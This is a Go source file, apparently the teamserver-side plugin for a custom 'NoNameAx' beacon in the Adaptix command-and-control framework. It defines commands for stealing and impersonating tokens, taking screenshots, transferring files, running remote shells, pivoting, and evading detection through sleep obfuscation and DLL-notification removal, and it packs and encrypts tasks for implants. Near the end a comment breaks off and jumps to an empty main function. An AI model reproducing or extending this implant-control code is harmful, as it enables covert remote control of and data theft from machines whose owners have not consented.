package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"sync"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// Ts callback constants - match Adaptix SDK values.
const (
	taskTypeTask           = adaptix.TASK_TYPE_TASK  // runnable command
	messageSeverityInfo    = adaptix.MESSAGE_INFO    // blue info in operator console
	messageSeverityError   = adaptix.MESSAGE_ERROR   // red error
	messageSeveritySuccess = adaptix.MESSAGE_SUCCESS // green success
)

func naxLogInfo(format string, args ...any) { fmt.Printf("[NoNameAx] [*] "+format+"\n", args...) }
func naxLogOk(format string, args ...any)   { fmt.Printf("[NoNameAx] [+] "+format+"\n", args...) }
func naxLogErr(format string, args ...any)  { fmt.Printf("[NoNameAx] [-] "+format+"\n", args...) }

// NaX wire command IDs - must match Wire.h NAX_CMD_* in the C beacon.
const (
	CMD_WHOAMI            byte = 0x10
	CMD_SLEEP             byte = 0x11
	CMD_EXIT_THREAD       byte = 0x12
	CMD_EXIT_PROC         byte = 0x13
	CMD_CD                byte = 0x14
	CMD_PWD               byte = 0x15
	CMD_MKDIR             byte = 0x16
	CMD_RMDIR             byte = 0x17
	CMD_CAT               byte = 0x18
	CMD_LS                byte = 0x19
	CMD_CP                byte = 0x1A
	CMD_MV                byte = 0x1B
	CMD_BOF               byte = 0x20
	CMD_SCREENSHOT        byte = 0x21
	CMD_DOWNLOAD          byte = 0x22
	CMD_PS_LIST           byte = 0x23
	CMD_PS_KILL           byte = 0x24
	CMD_PS_RUN            byte = 0x25
	CMD_UPLOAD            byte = 0x26
	CMD_RM                byte = 0x27
	CMD_SAVEMEMORY        byte = 0x2A
	CMD_CHUNKSIZE         byte = 0x2B
	CMD_PROFILE           byte = 0x30
	CMD_PIVOT_EXEC        byte = 0x37
	CMD_LINK              byte = 0x38
	CMD_UNLINK            byte = 0x39
	CMD_JOB_LIST          byte = 0x28
	CMD_JOB_KILL          byte = 0x29
	CMD_WATCHDOG_SET      byte = 0x2C
	CMD_BOF_STOMP         byte = 0x31
	CMD_SLEEPMASK_SET     byte = 0x32
	CMD_SLEEPOBF_CONFIG   byte = 0x33
	CMD_TOKEN_GETUID byte = 0x50
	CMD_TOKEN_STEAL  byte = 0x51
	CMD_TOKEN_USE    byte = 0x52
	CMD_TOKEN_LIST   byte = 0x53
	CMD_TOKEN_RM     byte = 0x54
	CMD_TOKEN_REVERT byte = 0x55
	CMD_TOKEN_MAKE   byte = 0x56
	CMD_TOKEN_PRIVS  byte = 0x57
	CMD_DLL_NOTIFY_LIST   byte = 0x3A
	CMD_DLL_NOTIFY_REMOVE byte = 0x3B
	CMD_SHELL_START        byte = 0x47
	CMD_SHELL_WRITE        byte = 0x48
	CMD_SHELL_CLOSE        byte = 0x49

	JOB_OUTPUT   byte = 0x01
	JOB_COMPLETE byte = 0x02
	JOB_KILLED   byte = 0x03
)

// NaX wire status codes - must match Wire.h NAX_STATUS_* in the C beacon.
const (
	STATUS_OK    byte = 0x00
	STATUS_ERR   byte = 0x01
	STATUS_ASYNC byte = 0x10
)

// Adaptix BOF callback type tags - must match Bof.h CALLBACK_AX_* in the C beacon.
const (
	CALLBACK_SCREENSHOT byte = 0x81 // CALLBACK_AX_SCREENSHOT
	CALLBACK_DOWNLOAD   byte = 0x82 // CALLBACK_AX_DOWNLOAD_MEM

	DL_START    byte = 0x01
	DL_CONTINUE byte = 0x02
	DL_FINISH   byte = 0x03

	UPLOAD_CHUNK_DEFAULT = 0x200000 // 2 MB
	UPLOAD_CHUNK_MAX     = 0x400000 // 4 MB
	UPLOAD_CHUNK_MIN     = 4096
)

// Teamserver is the subset of Adaptix host callbacks the agent plugin uses.
type Teamserver interface {
	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, updateData adaptix.TaskData)
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentUpdateDataPartial(agentId string, updateData any) error
	TsScreenshotAdd(agentId string, Note string, Content []byte) error
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsExtenderDataSave(extenderName, key string, value []byte) error
	TsExtenderDataLoad(extenderName, key string) ([]byte, error)
	TsExtenderDataDelete(extenderName, key string) error
	TsExtenderDataKeys(extenderName string) ([]string, error)

	TsEventHookOnPost(eventType, name string, handler func(any) error) string

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsListenerInteralHandler(watermark string, data []byte) (string, error)
	TsPivotCreate(pivotId, pAgentId, chAgentId, pivotName string, isRestore bool) error
	TsPivotDelete(pivotId string) error
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsAgentProcessData(agentId string, bodyData []byte) error
	TsAgentSetTick(agentId string, listenerName string) error

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)
	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, reason string) error
	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
}

type PluginAgent struct{}
type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string

	// agentIdentityCache caches the identity fields parsed from a REGISTER frame
	// so that re-registrations triggered by HEARTBEAT frames (after the operator
	// deletes a session from the UI) can return the full Computer/Username/etc.
	// rather than bare placeholder values.
	// Key: beaconID (string), Value: adaptix.AgentData (identity fields only).
	agentIdentityCache sync.Map

	// pendingCmdIds tracks the cmd_id (first byte of task.Data) for each in-flight
	// task so that ProcessData can take type-specific actions when the result arrives
	// (e.g. calling TsAgentUpdateData after a CMD_SLEEP response).
	// Key: TaskId (8-char hex string), Value: cmd_id (byte).
	pendingCmdIds sync.Map

	// activeJobs tracks async BOF jobs that have been acknowledged (STATUS_ASYNC)
	// but not yet completed. When a result arrives for a tracked taskId, it's
	// handled as job output rather than a regular command result.
	// Key: TaskId (8-char hex string), Value: true.
	activeJobs sync.Map

	// activeShells tracks remote shell sessions. When a SHELL_START task
	// is dispatched, the taskId (= terminalId) is stored here. Results
	// arriving for tracked shell IDs route to terminal handling.
	// Key: TaskId (8-char hex string), Value: true.
	activeShells sync.Map

	// activeDownloads tracks chunked downloads in progress.  The first result
	// (DL_START) stores the cmdId here; subsequent results (DL_CONTINUE/DL_FINISH)
	// use it since pendingCmdIds is consumed on the first hit.
	// Key: TaskId (8-char hex string), Value: true.
	activeDownloads sync.Map

	// activeUploads tracks upload sessions in progress (drip-fed one chunk per heartbeat).
	// Key: memoryId (uint32), Value: *uploadSession.
	activeUploads sync.Map

	// taskMemoryIds maps SAVEMEMORY and UPLOAD taskIds to their memoryId
	// so result handlers can look up upload progress state.
	// Key: TaskId (8-char hex string), Value: uint32 memoryId.
	taskMemoryIds sync.Map

	// pendingProfiles holds the ProfileConfig for CMD_PROFILE tasks that have
	// been sent to the beacon but not yet confirmed.
	// Key: agentId (string), Value: *ProfileConfig.
	pendingProfiles sync.Map

	// sleepmaskBofCache holds the compiled sleepmask BOF (.o) bytes.
	// Built during BuildPayload when beacongate is enabled.
	// Sent to agents via CMD_SLEEPMASK_SET command.
	sleepmaskBofCache []byte
)

const (
	extenderNameProfiles = "nax_profiles"
	extenderNameAgents   = "nax_agents"
	extenderNamePivots   = "nax_pivots"
)

// InitPlugin is the symbol Adaptix Server looks up after loading the .so.
// Signature mirrors the reference plugin.
func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	if ts != nil {
		Ts, _ = ts.(Teamserver)
	}
	loadCacheFromStore()
	registerCleanupHooks()
	return &PluginAgent{}
}

// --- PluginAgent stubs ---

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	return nil, nil
}

// --- ExtenderAgent crypto ---

// Encrypt AES-128-CBC-encrypts data using the agent's SessionKey.
// The Adaptix server calls this in PackData before handing packed tasks
// to the listener (HTTP) or PivotPackData (SMB pivot). The listener
// must NOT add its own encryption layer on top - it only applies
// profile transforms (prepend/append/encode/mask).
func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	if len(key) != 16 {
		return data, nil
	}
	return EncryptCBCRandomIV(key, data)
}

// Decrypt AES-128-CBC-decrypts data using the agent's SessionKey.
// The server calls this before ProcessData for both HTTP and pivot paths.
// The listener strips profile transforms but does NOT decrypt - that
// responsibility lives here so pivots (where no listener is involved)
// also get proper decryption.
func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	if len(key) != 16 {
		return data, nil
	}
	return DecryptCBC(key, data)
}

// PackTasks serialises ALL pending tasks into one response payload.
// Adaptix calls this once per agent check-in with every queued task and marks
// all of them as dispatched after the call returns - tasks not included in the
// returned bytes are silently dropped.  Concatenating all task frames here lets
// the beacon process them sequentially in a single response cycle.
func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	if len(tasks) == 0 {
		return nil, nil
	}
	var out []byte
	for _, task := range tasks {
		if len(task.Data) == 0 {
			continue
		}
		taskIdInt, err := strconv.ParseInt(task.TaskId, 16, 64)
		if err != nil {
			return nil, fmt.Errorf("nonameax: PackTasks: bad TaskId %q: %w", task.TaskId, err)
		}
		pendingCmdIds.Store(task.TaskId, task.Data[0])
		body := EncodeTaskBody(uint32(taskIdInt), task.Data)
		out = append(out, EncodeFrame(WireTypeTask, body)...)
	}
	return out, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	if len(data) == 0 {
		return adaptix.TaskData{}, fmt.Errorf("nonameax: PivotPackData: empty data for pivotId %q (child has no tasks)", pivotId)
	}
	pivotIdInt, err := strconv.ParseUint(pivotId, 16, 32)
	if err != nil {
		return adaptix.TaskData{}, fmt.Errorf("nonameax: PivotPackData: bad pivotId %q: %w", pivotId, err)
	}
	// Wire: cmd_id(1) | args_len(4LE) | pivot_id(4LE) | data_len(4LE) | data
	argsLen := 4 + 4 + len(data)
	buf := make([]byte, 5+argsLen)
	buf[0] = CMD_PIVOT_EXEC
	binary.LittleEndian.PutUint32(buf[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(buf[5:9], uint32(pivotIdInt))
	binary.LittleEndian.PutUint32(buf[9:13], uint32(len(data)))
	copy(buf[13:], data)

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   buf,
		Sync:   false,
	}
	return taskData, nil
}

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: tunnelConnectTCP,
		ConnectUDP: tunnelConnectUDP,
		WriteTCP:   tunnelWriteTCP,
		WriteUDP:   tunnelWriteUDP,
		Pause:      tunnelPause,
		Resume:     tunnelResume,
		Close:      tunnelClose,
		Reverse:    tunnelReverse,
	}
}

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: terminalStart,
		Write: terminalWrite,
		Close: terminalClose,
	}
}

func terminalStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	taskIdStr := fmt.Sprintf("%08x", uint32(terminalId))
	activeShells.Store(taskIdStr, true)

	programOEM := ""
	if Ts != nil {
		programOEM = Ts.TsConvertUTF8toCp(program, oemCP)
	} else {
		programOEM = program
	}
	programBytes := []byte(programOEM)

	// Wire: cmd_id(1) | args_len(4LE) | program_len(4LE) | program_bytes
	argsLen := 4 + len(programBytes)
	data := make([]byte, 5+argsLen)
	data[0] = CMD_SHELL_START
	binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(data[5:9], uint32(len(programBytes)))
	copy(data[9:], programBytes)

	return adaptix.TaskData{
		TaskId: taskIdStr,
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   data,
		Sync:   false,
	}
}

func terminalWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	dataOEM := ""
	if Ts != nil {
		dataOEM = Ts.TsConvertUTF8toCp(string(data), oemCP)
	} else {
		dataOEM = string(data)
	}
	if oemCP > 0 {
		dataOEM = strings.ReplaceAll(dataOEM, "\n", "\r\n")
	}
	dataBytes := []byte(dataOEM)

	// Wire: cmd_id(1) | args_len(4LE) | terminalId(4LE) | data_len(4LE) | data_bytes
	argsLen := 4 + 4 + len(dataBytes)
	buf := make([]byte, 5+argsLen)
	buf[0] = CMD_SHELL_WRITE
	binary.LittleEndian.PutUint32(buf[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(buf[5:9], uint32(terminalId))
	binary.LittleEndian.PutUint32(buf[9:13], uint32(len(dataBytes)))
	copy(buf[13:], dataBytes)

	return adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   buf,
		Sync:   false,
	}
}

func terminalClose(terminalId int) adaptix.TaskData {
	taskIdStr := fmt.Sprintf("%08x", uint32(terminalId))
	activeShells.Delete(taskIdStr)

	// Wire: cmd_id(1) | args_len(4LE) | terminalId(4LE)
	data := make([]byte, 9)
	data[0] = CMD_SHELL_CLOSE
	binary.LittleEndian.PutUint32(data[1:5], 4)
	binary.LittleEndian.PutUint32(data[5:9], uint32(terminalId))

	return adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   data,
		Sync:   false,
	}
}

// saveProfileToStore persists a profile override via TsExtenderData so the
func main() {}
